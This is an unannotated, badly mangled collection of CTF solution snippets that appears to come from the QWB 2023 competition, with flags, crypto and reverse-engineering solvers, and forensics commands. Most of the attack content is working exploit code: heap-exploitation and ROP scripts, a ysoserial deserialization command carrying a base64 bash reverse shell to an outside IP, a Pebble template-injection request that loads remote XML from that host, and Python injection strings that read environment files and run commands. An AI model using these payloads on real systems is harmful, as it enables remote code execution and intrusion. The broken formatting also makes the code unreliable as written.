oiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX1zOjExOiIAKgBiaW5kQXR0ciI7YToxOntpOjA7czowOiIiO319czo2OiJwYXJlbnQiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMDoiACoAb3B0aW9ucyI7YToxOntzOjY6InByZWZpeCI7czo2OiJqZWxseS8iO31zOjY6IgAqAHRhZyI7YjoxO31zOjk6IgAqAGNvbmZpZyI7YToyOntzOjY6ImV4cGlyZSI7czowOiIiO3M6MTI6InNlc3Npb25fbmFtZSI7czowOiIiO319fX19fX0

flag{c7c7e293-d532-496b-b414-c28bb3fe9aa7}

grpcui -plaintext ip:
port

java -jar ysoserial-main-923a2bda4e-1.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny43Ni4xNzguODkvOTAwMSAwPiYx}|{base64,-d}|{bash,-i}" | base64

#!/usr/bin/env python3
from pwncli import *cli_script()
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
def cmd(i):    sla(">> ", i)
def add(sz, data="deadbeef"):    cmd('1')    sla("Size: ", str(sz))    sa("Note: ", data)
def show(idx):    cmd('2')    sla("Index: ", str(idx))
def delete(idx):    cmd('3')    sla("Index: ", str(idx))
add(0x410) # 0add(0xe0) # 1add(0x430) # 2add(0x430) # 3add(0x100) # 4add(0x480) # 5add(0x420) # 6add(0x10)
delete(0)delete(3)delete(6)
delete(2)
add(0x450, flat({0x438: p16(0x551)})) # 0
add(0x410) # 2add(0x420) # 3add(0x410) # 6
delete(6) delete(2) add(0x410) # 2add(0x410) # 6
delete(6) delete(3)delete(5)
add(0x4f0, b"a"*0x488 + p64(0x431)) # 3
add(0x3b0) # 5
# add(0x410) # 6
delete(4)
add(0x108, b"a"*0x100 + p64(0x550))
add(0x410)
delete(3)
add(0x10)
show(6)libcaddr = recv_current_libc_addr()leak("libcaddr", libcaddr)
lbs = set_current_libc_base_and_log(libcaddr, 0x219ce0)
add(0x3f0)add(0x60, flat({0x18: 0x91}))add(0x3f0)
delete(6)
show(8)heapaddr = (u64_ex(rl()[-6:-1]) << 12) + 0xc30leak("heap addr", heapaddr)
delete(4)delete(10)
stdoutaddr = libc.sym._IO_2_1_stdout_
add(0x80, flat({0x48: 0x401, 0x50: p64(((heapaddr + 0x470) >> 12) ^ (stdoutaddr-0x10))[:-1]}))
CurrentGadgets.set_find_area(find_in_elf=False, find_in_libc=True, do_initial=False)
pay = IO_FILE_plus_struct().house_of_apple2_stack_pivoting_when_do_IO_operation(stdoutaddr, libc.sym._IO_wfile_jumps-0x20, CG.leave_ret(), CG.pop_rbp_ret(), heapaddr+0x470-0x8)
add(0x3f0, CG.orw_chain(heapaddr+0x538, heapaddr, buf_len=0x100) + b"/flagx00")
add(0x3f0, flat_z({0x10:
pay}))
ia()

from pwncli import *
gift.elf = ELF("./A-rtsp")
context.log_level = 'debug'context.arch="amd64"context.os='linux'
# 设置RTSP服务器的地址和端口servers = "8.147.129.5"port = 15947
# 连接服务器conn = remote(servers, port)gift.io = conn
seq = 1track_url = "rtsp://{0}:{1}/*".format(servers, port)
request = f"GET_PARAMETER {track_url} RTSP/1.0rnCSeq: {seq}rnGET_INFO: 2023rnrn"seq += 1conn.send(request)
ru(" need this ")addr = int16_ex(rl())codebase = addr - 0x2A9990set_current_code_base_and_log(codebase)CG.set_find_area()
request = f"SET_PARAMETER {track_url} RTSP/1.0rnCSeq: {seq}rDESCRIBE_FLAG: qwbrnrn"seq += 1conn.send(request)
#  0x000000000002e098: mov qword ptr [rax + 0x10], rdx; nop; pop rbp; ret;track_url = "rtsp://{0}:{1}/wavAudioTest".format(servers, port)ssss = b"a"*(0x1a0-8-0xc) + b"xa0" + b"a"*7 +  flat([    CG.pop_rax_ret(),    addr-0x10,    CG.pop_rdx_ret(),    u64_ex("/flag"),    0x000000000002e098 + codebase, 0,    CG.orw_chain(addr, addr+0x10, 6, 5, 0x60)])
ssss= ssss.decode('latin-1')request = f"DESCRIBE {track_url} RTSP/1.0rnCSeq: {seq}rnvul_string: {ssss}rnrn"seq += 1conn.send(request)
# 关闭连接conn.interactive()

#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-12-16 19:02:
51Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc=ELF('./libc-2.27.so')
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug

def add(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'add') sla('Enter new username: ', (name)) sleep(0.1) #......
def switch(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'switch') sla('nter username to switch to: ', (name)) sleep(0.1) #......
def listuser(): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'listuser') sleep(0.1) #......
def read(): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'read') sleep(0.1)
def dele(name): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'delete') sla('Enter username to delete: ', (name)) sleep(0.1) #......
def message(name,sz,cont): sla('Choose action (add, delete, switch, message, read, listuser, exit):', 'message') sla('To: ', (name)) sla('Message size:', str(sz)) sla('Content: ', cont) sleep(0.1)
sla('Enter new username: ','fxxker')
def leak_libc(): add(b'aaaaaaaaaaaaaaaaa') dele(b'aaaaaaaaaaaaaaaaa') message(b'fxxker',2311,b'a') message(b'fxxker',1716,b'a') dele(b'fxxker') message(b'fxxker',96,b'a'*96) read() leak_lb = recv_current_libc_addr(0,0x100) leak_ex2(leak_lb) return leak_lb
lb = leak_libc() - 0x3ec3a0libc.address = lbleak_ex2(lb)
message(b'fxxker',1624,b'a')switch(b'fxxker')dele(b'fxxker')dele(b'fxxker')listuser()read()'''b' fxxker -> fxxker: xa0x03xe7xd5x96x7fn''''switch(b'fxxker')dele(b'fxxker')switch(b'fxxker')switch(b'fxxker')message(b'fxxker',3894,b'a')switch(b'fxxker')switch(b'fxxker')dele(b'fxxker')add(b'aaaaaaaa')add(b'aaaa')message(b'fxxker',2252,b'a')message(b'fxxker',1737,flat({ 0x10:'x00/bin/sh;x00', 1232-0x10:[ 0,0x61 ], 1737:''}))read()'''b' Donen''''dele(b'aaaaaaaa')listuser()add(b'aaaaaaa')
message(b'fxxker',1875,'a')message(b'fxxker',1760-8,flat( { 0:'/bin/shx00', 1232:
libc.sym.__free_hook - 0x8 }))
message(b'fxxker',0x60-8,flat( { 0:'/bin/shx00', 0x60-8:'' }))message(b'fxxker',0x60-8,flat( { 0:['/bin/shx00', libc.sym.system] }))add('fxxker')read()
ia()

from pwncli import *cli_script()set_remote_libc('libc-2.27.so')
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
payload = '''int c;
int main(){ int b; int libc; int* free_hook; char* sh; libc = 0 ; free_hook = libc + 1; free_hook = malloc(0x500); sh = malloc(0x10); free(free_hook); libc = *free_hook - 0x3ebca0; printf("%lx",libc); free_hook = libc + 0x3ed8e8; *free_hook = libc + 0x4F420; sh[0] = 's'; sh[1] = 'h'; free(sh); return 0;}'''sla('size:',str(len(payload)))sla('et:',payload)ia()

flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}

strings main.mem | grep "Linux version"

python2 vol.py -f C:
Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -L | findstr "Desktop"

python2 vol.py -f C:
Users22826Desktopmain.mem --profile=LinuxUbuntu2004x64 linux_find_file -i 0xffff9ce28fe300e8 -Ohave_your_fun.jocker

flag{It's_So_Hard_To_Find_A_Picture}

#!/usr/bin/env python3
from pwncli import *
cli_script()
io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libccontext.arch = "amd64"

def add(des, next): io.recvuntil(b"4. Quit.") io.sendline(b"1") io.recvuntil(b"Input destination IP:") io.sendline(des) io.recvuntil(b"Input the next hop:") io.sendline(next)

def show(des): io.recvuntil(b"4. Quit.") io.sendline(b"2") io.recvuntil(b"Input destination IP:") io.sendline(des)

def get_flag(): io.recvuntil(b"4. Quit.") io.sendline(b"3")

def leak(data): add(str(data).encode() + b".0.0.0", b"0.0.0.0") get_flag() show(str(data).encode() + b".0.0.0") io.recvuntil(b"The next hop is ") info = io.recvuntil(b"n", drop=True) parts = info.split(b".") parts = parts[::-1] ascii_values = [chr(int(part)) for part in parts] ascii_values = "".join(ascii_values) flag = ascii_values return flag

add("0.0.0.0", "0.0.0.0") # 32add("64.0.0.0", "0.0.0.0") # 2add("32.0.0.0", "0.0.0.0") # 3add("96.0.0.0", "0.0.0.0") # 2add("16.0.0.0", "0.0.0.0") # 4add("80.0.0.0", "0.0.0.0") # 2add("48.0.0.0", "0.0.0.0") # 3add("112.0.0.0", "0.0.0.0") # 2add("0.4.0.0", "0.0.0.0") # 14
flag = ""get_flag()show(b"0.4.0.0") # 0x40io.recvuntil(b"The next hop is ")info = io.recvuntil(b"n", drop=True)parts = info.split(b".")parts = parts[::-1]ascii_values = [chr(int(part)) for part in parts]ascii_values = "".join(ascii_values)flag += ascii_valueslog.success(flag)
flag += leak(128)log.success(flag)
flag += leak(192)log.success(flag)
flag += leak(160)log.success(flag)
flag += leak(144)log.success(flag)
flag += leak(208)log.success(flag)
flag += leak(176)log.success(flag)
flag += leak(240)log.success(flag)
flag += leak(224)log.success(flag)
add(b"128.4.0.0", b"0.0.0.0")get_flag()show(b"128.4.0.0") # 0x40io.recvuntil(b"The next hop is ")info = io.recvuntil(b"n", drop=True)parts = info.split(b".")parts = parts[::-1]ascii_values = [chr(int(part)) for part in parts]ascii_values = "".join(ascii_values)flag += ascii_valueslog.success(flag)io.interactive()

#!/usr/bin/env python3'''Author:
7resp4ssDate:
2023-12-16 13:34:
34Usage: Debug : python3 exp.py debug elf-file-path -t -b malloc Remote: python3 exp.py remote elf-file-path ip:
port'''
from pwncli import *cli_script()

io: tube = gift.ioelf: ELF = gift.elflibc: ELF = gift.libc
filename = gift.filename # current filenameis_debug = gift.debug # is debug or not is_remote = gift.remote # is remote or notgdb_pid = gift.gdb_pid # gdb pid if debug
ru('There is a gift for you ')leak_stack = int(rl()[:-1],16)leak_ex2(leak_stack)

attack_stack = leak_stack - 0x8pd = flat( { 0:'%' + str(0xce) + 'c' + '%11$hhn%19$p', 0x18:[0x401205], 0x28:
attack_stack, })s(pd)ru('0x')leak_libc = int(r(12),16)leak_ex2(leak_libc)lb = leak_libc - 0x24083libc.address = lb
pd = flat( { 0x18:[ CG.pop_rdi_ret(), CG.bin_sh(), lb + 0x51cd2] })S()s(pd)
ia()

org.springframework.context.support.ClassPathXmlApplicationContext

org.springframework.context."+"support.ClassPathXmlApplicationContext

POST /uploadFile HTTP/1.1Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:
8088Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 567
content=%7B%25%20set%20y%3D%20beans.get(%22org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory%22).resourceLoader.classLoader.loadClass(%22java.beans.Beans%22)%20%25%7D%0A%7B%25%20set%20yy%20%3D%20%20beans.get(%22jacksonObjectMapper%22).readValue(%22%7B%7D%22%2C%20y)%20%25%7D%0A%7B%25%20set%20yyy%20%3D%20yy.instantiate(null%2C%22org.springframework%22%2B%22.context.support.ClassPathXmlApplicationContext%22)%20%25%7D%0A%7B%7B%20yyy.setConfigLocation(%22http%3A%2F%2F47.76.178.89%3A8081%2F1.xml%22)%20%7D%7D%0A%7B%7B%20yyy.refresh()%20%7D%7D

public static String general_time() { LocalDateTime currentTime = LocalDateTime.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss"); String var10000 = currentTime.format(formatter); String fileName = "file_" + var10000 + ".pebble"; System.out.println("filename is " + fileName); return fileName;}

GET /?x=../../../../../../../../tmp/file_20231217_160502 HTTP/1.1Host: eci-2ze7ksohishwh34f2u43.cloudeci1.ichunqiu.com:
8088Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close

#include <stdio.h>#include <stdint.h>
//加密函数void encrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){ unsigned int i; uint32_t v0 = v[0], v1 = v[1], sum = 0x90508D47, delta = 0x77BF7F99; for (int j = 0; j < 4; j++) { for (i = 0; i < num_rounds; i++) { v0 += (((v1 >> 4) ^ (v1 << 5)) + v1) ^ (sum + key[sum & 3]) ^ sum; v1 += (((v0 >> 4) ^ (v0 << 5)) + v0) ^ (sum + key[(sum >> 11) & 3]); sum -= delta; } } v[0] = v0; v[1] = v1; printf("sum==0x%xn", sum);}
//解密函数void decrypt(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){ unsigned int i; uint32_t v0 = v[0], v1 = v[1], delta = 0x77BF7F99, sum = 0xd192c263; for (int j = 0; j < 4; j++) { for (i = 0; i < num_rounds; i++) { sum += delta; v1 -= (((v0 >> 4) ^ (v0 << 5)) + v0) ^ (sum + key[(sum >> 11) & 3]); v0 -= (((v1 >> 4) ^ (v1 << 5)) + v1) ^ (sum + key[sum & 3]) ^ sum; } } v[0] = v0; v[1] = v1; printf("sum==0x%xn", sum);}
//打印数据 hex_or_chr: 1-hex 0-chrvoid dump_data(uint32_t *v, int n, bool hex_or_chr){ if (hex_or_chr) { for (int i = 0; i < n; i++) { printf("0x%x,", v[i]); } } else { for (int i = 0; i < n; i++) { for (int j = 0; j < sizeof(uint32_t) / sizeof(uint8_t); j++) { printf("%c", (v[i] >> (j * 8)) & 0xFF); } } } printf("n"); return;}
int main(){ // v为要加解密的数据 uint32_t v[] = {0x9523f2e0, 0x8ed8c293, 0x8668c393, 0xddf250bc, 0x510e4499, 0x8c60bd44, 0x34dcabf2, 0xc10fd260}; // k为加解密密钥，4个32位无符号整数，密钥长度为128位 uint32_t k[4] = {0x62, 0x6F, 0x6D, 0x62}; // num_rounds，建议取值为32 unsigned int r = 33;
 int n = sizeof(v) / sizeof(uint32_t); /* printf("加密前明文数据："); dump_data(v, n, 1);
 for (int i = 0; i < n / 2; i++) { encrypt(r, &v[i * 2], k); } */ printf("加密后密文数据："); dump_data(v, n, 1);
 for (int i = 0; i < n / 2; i++) { decrypt(r, &v[i * 2], k); }
 printf("解密后明文数据："); dump_data(v, n, 1);
 printf("解密后明文字符："); dump_data(v, n, 0);
 return 0;}
// W31com3_2_Th3_QwbS7_4nd_H4v3_Fun

enc = [0x3A, 0x2C, 0x4B, 0x51, 0x68, 0x46, 0x59, 0x63, 0x24, 0x04, 0x5E, 0x5F, 0x00, 0x0C, 0x2B, 0x03, 0x29, 0x5C, 0x74, 0x70, 0x6A, 0x62, 0x7F, 0x3D, 0x2C, 0x4E, 0x6F, 0x13, 0x06, 0x0D, 0x06, 0x0C, 0x4D, 0x56, 0x0F, 0x28, 0x4D, 0x51, 0x76, 0x70, 0x2B, 0x05, 0x51, 0x68, 0x48, 0x55, 0x24, 0x19]tbs = ["l+USN4J5Rfj0TaVOcnzXiPGZIBpoAExuQtHyKD692hwmqe7/Mgk8v1sdCW3bYFLr", "FGseVD3ibtHWR1czhLnUfJK6SEZ2OyPAIpQoqgY0w49u+7rad5CxljMXvNTBkm/8", "Hc0xwuZmy3DpQnSgj2LhUtrlVvNYks+BX/MOoETaKqR4eb9WF8ICGzf6id1P75JA", "pnHQwlAveo4DhGg1jE3SsIqJ2mrzxCiNb+Mf0YVd5L8c97/WkOTtuKFZyRBUPX6a", "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]aaa = [ord(c) for c in "plxXOZtaiUneJIhk7qSYEjD1Km94o0FTu52VQgNL3vCBH8zsA/b+dycGPRMwWfr6"]for i in range(len(aaa)): aaa[i] ^= 0x27v5 = aaa[6:6+0x15]v7 = 2023v6 = 0v8 = 48xor = []while v6 < v8 - 1: if v6 % 3 == 1: v7 = (v7 + 5) % 20 v3 = v5[v7 + 1] elif v6 % 3 == 2: v7 = (v7 + 7) % 19 v3 = v5[v7 + 2] else: v7 = (v7 + 3) % 17 v3 = v5[v7 + 3] v6 += 1 xor.append(v3)for i in range(len(enc)-1, -1, -1): enc[i] ^= enc[i-1] if i <= len(enc)-2: enc[i] ^= xor[i]print(bytes(enc))
# jZqSWcUtWBLlOriEfcajWBSRstLlkEfFWR7j/R7dMCDGnp==

flag{3ea590ccwxehg715264fzxnzepqz}

from pwn import remote
ip = ''port = ''
class GetStatus: def __init__(self, _ip=ip, _port=port) -> None: self.r = remote(_ip, _port) self.score = 0
 def getdiff(self, out): self.r.sendlineafter('请出拳'.encode(), str(out).encode()) self.r.recvuntil('分数：'.encode()) newscore = int(self.r.recvline().decode()) diff = newscore - self.score self.score = newscore return diff
 def test_list(self, lis): for out in lis: diff = self.getdiff(out) if self.score >= 260: return 'win' return diff
current_best = [0] * 5diff2out = { 3: 0, 1: 2, 0: 1}
while len(current_best) <= 100: current_best.append(0) c = GetStatus() diff = c.test_list(current_best) if c.score >= 260: c.r.interactive() break c.r.close() current_best[-1] = diff2out[diff] print(f'Round {len(current_best)}: {current_best}')


```
from Crypto.Util.number import long_to_bytesp=91027438112295439314606669837102361953591324472804851543344131406676387779969e = 641747c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943n=p^5K=Zmod(p^5)a=K(c).nth_root(e)b=K(1).nth_root(e)a=int(a)b=int(b)print(b,a)
from tqdm import tqdmfor i in tqdm(range(e)): a=(a*b)%n m=long_to_bytes(int(a)) if b"flag" in m: print(m) break
flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a}
import itertools
from gmpy2 import *
from Crypto.Util.Padding import *
from Crypto.Util.number import *
from tqdm import tqdm

p = 173383907346370188246634353442514171630882212643019826706575120637048836061602034776136960080336351252616860522273644431927909101923807914940397420063587913080793842100264484222211278105783220210128152062330954876427406484701993115395306434064667136148361558851998019806319799444970703714594938822660931343299
g = 5
c = 105956730578629949992232286714779776923846577007389446302378719229216496867835280661431342821159505656015790792811649783966417989318584221840008436316642333656736724414761508478750342102083967959048112859470526771487533503436337125728018422740023680376681927932966058904269005466550073181194896860353202252854
q = 86691953673185094123317176721257085815441106321509913353287560318524418030801017388068480040168175626308430261136822215963954550961903957470198710031793956540396921050132242111105639052891610105064076031165477438213703242350996557697653217032333568074180779425999009903159899722485351857297469411330465671649

flag_len=12
fake_flag_pad='flag{'.encode() +'x00'.encode()*flag_len+'}'.encode()
flag_pattern = (pad(fake_flag_pad, 128))
    #print(flag_pattern)
flag_pattern=bytes_to_long(flag_pattern)

pattern=1<<888
    #print(bin(pattern))

cc = c * inverse(pow(g,flag_pattern,p),p)%p
cc = pow(cc, inverse(pattern, q), p)
print(cc)
table = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
dic = dict()
gtemp= pow(g, 2**48, p)

for half_flag1 in tqdm(itertools.product(table, repeat=6)):
 half_flag1 = bytes_to_long(''.join(half_flag1).encode())
 temp = cc * powmod(gtemp, -(half_flag1), p) % p
 dic[temp] = half_flag1
for half_flag2 in tqdm(itertools.product(table, repeat=6)):
 half_flag2 = bytes_to_long(''.join(half_flag2).encode())
 temp = powmod(g, half_flag2, p)
 if temp in dic:
 print(long_to_bytes(dic[temp]) + long_to_bytes(half_flag2))
from pwn import *from string import printableconn = remote('101.200.122.251', 12188)non_matching_strings = []for i in range(9): for char in printable: payload = 'a'*i + char + 'a'*(8-i) print(conn.recvuntil(b'Enter a string (should be less than 10 bytes):')) conn.sendline(payload.encode()) response = conn.recvline().decode().strip() if response != "Here is your code coverage: 110000000": non_matching_strings.append(payload)for string in non_matching_strings: print(string)
FLAG：qwb{YouKnowHowToFuzz!}
flag{welcome_to_qwb_2023}
{13212}'+(print(open('/proc/1/environ').read()))+'
flag{61e81b4f-566c-49f5-84dd-d79319fddc82}
{13212}'+(open('wsy', "a").write('151155160157162'))+'
{13212}'+(open('wsy', "a").write('t 157'))+'
{13212}'+(open('wsy', "a").write('163;157'))+'
{13212}'+(open('wsy', "a").write('163.'))+'
{13212}'+(open('wsy', "a").write('163y'))+'
{13212}'+(open('wsy', "a").write('st'))+'
{13212}'+(open('wsy', "a").write('em("nl 146*>hzy")'))+'
{13212}'+open('143157de.py','w').write(open('wsy').read())+'
{13212}'+(print(open('hzy').read()))+'
flag{8f0a4ac2-52d3-4adb-a1a3-47e05997817d}
Do you want a flag? Let's listen a little longer.Genshin Impact starts.The weather is really nice today. It's a great day to listen to the Wabby Wabbo radio.If you don't know how to do it, you can go ahead and do something else first.may be flag is png picturedo you know QAM?
import scipy.io.wavfile as wavimport numpy as npimport sys
sample_rate, data = wav.read("flag.wav")for i in data: print(i)flag=''def repla(n): if n == -3: return '00' elif n == -1: return '01' elif n == 1: return '10' elif n == 3: return '11'
for x, y in data: n1 = round(float(x)) n2 = round(float(y)) flag += repla(n1) flag += repla(n2)print(flag)
#!/usr/bin/env python3
# encoding: utf-8
import osimport sysimport loggingimport hashlib
from Crypto.Cipher import AES
logging.basicConfig(level=logging.INFO)

def EVP_BytesToKey(password, key_len, iv_len): m = [] i = 0 while len(b''.join(m)) < (key_len + iv_len): md5 = hashlib.md5() data = password if i > 0: data = m[i - 1] + password md5.update(data) m.append(md5.digest()) i += 1 ms = b''.join(m) key = ms[:
key_len] iv = ms[key_len:
key_len + iv_len]
 return key, iv
def decrypt(cipher,password): key_len = int(256/8) iv_len = 16 mode = AES.MODE_CFB
 key, _ = EVP_BytesToKey(password, key_len, iv_len) cipher = bytes.fromhex(cipher) iv = cipher[:
iv_len] real_cipher = cipher[iv_len:]
 obj = AES.new(key, mode, iv, segment_size=128) plain = obj.decrypt(real_cipher)
 return plain

def main(): # test http request cipher = 'e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206'
 with open('rockyou.txt','rb') as f: lines = f.readlines() for password in lines: plain = decrypt(cipher,password.strip()) if b'HTTP' in plain: print(password,plain)
if __name__ == "__main__": main()
    #b'supermann' b'x03x0f192.168.159.131x00PGET /Why-do-you-want-to-know-what-this-is HTTP/1.1rnHost: 192.168.159.131rnUser-Agent: curl/8.4.0rnAccept: */*rnConnection: closernrn'
flag{dc7e57298e65949102c17596f1934a97}
tshark -r attach.pcapng -Y "tcp" -T fields -e tcp.segment_data > tcp.txt
import pyModeS
with open('tcp.txt','r')as f: lines = f.readlines()for data in lines: if len(data)==47: print(pyModeS.decoder.tell(data[18:]))
flag{4cf6729b9bc05686a79c1620b0b1967b}
import re
data_code = '''*&ptr[0] = unk_710;*&ptr[16] = unk_600;*&ptr[32] = unk_670;*&ptr[48] = unk_6A0;*&ptr[64] = unk_6D0;*&ptr[80] = *byte_810;*&ptr[96] = unk_650;*&ptr[112] = *byte_7E0;*&ptr[128] = *byte_780;*&ptr[144] = unk_720;*&ptr[160] = *byte_790;*&ptr[176] = *byte_760;*&ptr[192] = unk_6E0;*&ptr[208] = unk_5F0;*&ptr[224] = *byte_7F0;*&ptr[240] = unk_680;*&ptr[256] = *byte_830;*&ptr[272] = *byte_7A0;*&ptr[288] = *byte_850;*&ptr[304] = *byte_840;*&ptr[320] = unk_700;*&ptr[336] = unk_630;*&ptr[352] = unk_730;*&ptr[368] = unk_6F0;*&ptr[384] = unk_660;*&ptr[400] = unk_620;*&ptr[416] = *byte_820;*&ptr[432] = unk_640;*&ptr[448] = unk_6B0;*&ptr[464] = unk_690;*&ptr[480] = unk_710;*&ptr[496] = unk_6C0;*&ptr[512] = unk_670;*&ptr[528] = *byte_7B0;*&ptr[544] = unk_6D0;*&ptr[560] = *byte_7C0;'''.strip()
data = bytearray(0x240)for line in data_code.split('n'): off, ea = re.findall(r'ptr[(d+)].+_(.+);', line)[0] off = int(off, 10) ea = int(ea, 16) print(hex(off), hex(ea)) d = ida_bytes.get_bytes(ea, 16) for i in range(16): data[off+i] = d[i]print(bytes(data).hex())s = b''
for b in data: if 32 <= b <= 126: s += bytes([b])print(s)
// flag 1 2v52 = v91;v53 = (int64x2_t)v50;v94 = xmmword_650;v95 = xmmword_740;do{ // unsigned char ida_chars[] = // { // 14, 16, 52, 57, 23, 40, 5, 37, 25, 33, // 46, 12, 58, 22, 32, 32 // }; while ( 1 ) { v63 = idx & 7; // idx % 4 if ( (idx & 3) != 0 ) break; ror_pair = &ror_number[2 * v63]; v55 = (int64x2_t *)&ptr[4 * (idx >> 2)]; v56 = vaddq_s64(v55[1], v53); // round0 x12 = 3131313131313131 v57 = v55->n128_u64[1] + v52.n128_u64[1]; data_x11 = v55->n128_u64[0] + v52.n128_u64[0] + v57; data_x12 = __ROR8__(v57, -*ror_pair) ^ data_x11; v52.n128_u64[0] = data_x11; v60 = __ROR8__(v56.n128_u64[1], -ror_pair[1]); v53.n128_u64[1] = data_x12;
 data_x13 = vaddvq_s64(v56); data_x14 = v60 ^ data_x13; v52.n128_u64[1] = data_x14; ++idx; v53.n128_u64[0] = data_x13; if ( idx == 72 ) goto LABEL_146; } ror_pair2 = &ror_number[2 * v63]; data_x11 = v52.n128_u64[1] + v52.n128_u64[0]; v52.n128_u64[0] = data_x11; data_x12 = __ROR8__(v52.n128_u64[1], -*ror_pair2) ^ data_x11;
 v53.n128_u64[0] = vaddvq_s64(v53); v65 = __ROR8__(v53.n128_u64[1], -ror_pair2[1]); data_x13 = v53.n128_u64[0]; v53.n128_u64[1] = data_x12; data_x14 = v65 ^ v53.n128_u64[0]; v52.n128_u64[1] = data_x14; ++idx;}
while ( idx != 72 );
// x11 0x13c17ce8fc8b8157// x14 0x645d9ac2d095d15b// x13 0x6096448f5a2d874c// x12 0x477d6619faa7d1c7if ( !((data_x11 + 0x5474374041455247LL) ^ 0x6835B4293DD0D39ELL | (data_x14 - 0x7DC131EF140E7742LL) ^ 0xE69C68D3BC875A19LL | (data_x13 - 0x452C699C4F4C522DLL) ^ 0x1B69DAF30AE1351FLL | (data_x12 + 0x6523745F644E5642LL) ^ 0xACA0DA795EF62809LL) ) v49 = (int8x16_t *)aRight;
import struct
from ctypes import c_uint64
ror_number = [0x0E, 0x10, 0x34, 0x39, 0x17, 0x28, 0x05, 0x25, 0x19, 0x21, 0x2E, 0x0C, 0x3A, 0x16, 0x20, 0x20]N = (2**64-1)

def ror8(v, s): s = s % 64 return ((v >> s) | (v << (64-s))) & N

def rol8(v, s): s = s % 64 return ((v << s) | (v >> (64-s))) & N

